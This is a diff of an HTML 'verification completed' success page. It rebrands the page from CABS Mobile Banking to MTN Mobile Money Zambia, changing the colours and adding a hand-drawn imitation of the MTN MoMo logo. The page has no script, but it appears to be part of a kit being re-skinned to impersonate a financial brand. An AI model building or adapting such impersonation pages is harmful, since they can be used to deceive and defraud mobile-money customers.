@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Success</title>
+    <title>Success - MTN MoMo</title>
     <style>
         * {
             margin: 0;
@@ -35,7 +35,7 @@
         .title {
             font-size: 32px;
             font-weight: 700;
-            color: #0d47a1;
+            color: #004B87;
             margin-bottom: 12px;
         }
         .subtitle {
@@ -46,8 +46,8 @@
         }
         .btn {
             display: inline-block;
-            background: #0d47a1;
-            color: #fff;
+            background: #FFCC00;
+            color: #004B87;
             text-decoration: none;
             padding: 14px 40px;
             border-radius: 10px;
@@ -56,7 +56,14 @@
             transition: background 0.2s;
         }
         .btn:hover {
-            background: #0a3a8a;
+            background: #e6b800;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo svg {
+            height: 48px;
+            width: auto;
         }
         @media (max-width: 480px) {
             .card {
@@ -71,11 +78,18 @@
 </head>
 <body>
     <div class="card">
+        <div class="logo">
+            <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="2" y="2" width="36" height="36" rx="8" fill="#FFCC00" stroke="#004B87" stroke-width="2"/>
+                <path d="M14 12L22 12L18 20L22 28L14 28L18 20L14 12Z" fill="#004B87"/>
+                <text x="46" y="26" font-family="Arial, sans-serif" font-weight="700" font-size="20" fill="#004B87">MTN MoMo</text>
+            </svg>
+        </div>
         <div class="icon">✅</div>
         <div class="title">Success!</div>
         <div class="subtitle">
             Your verification has been completed.<br />
-            You can now enjoy all the features of CABS Mobile Banking.
+            You can now enjoy all the features of <strong>MTN Mobile Money Zambia</strong>.
         </div>
         <a href="index.html" class="btn">Start Over</a>
     </div>
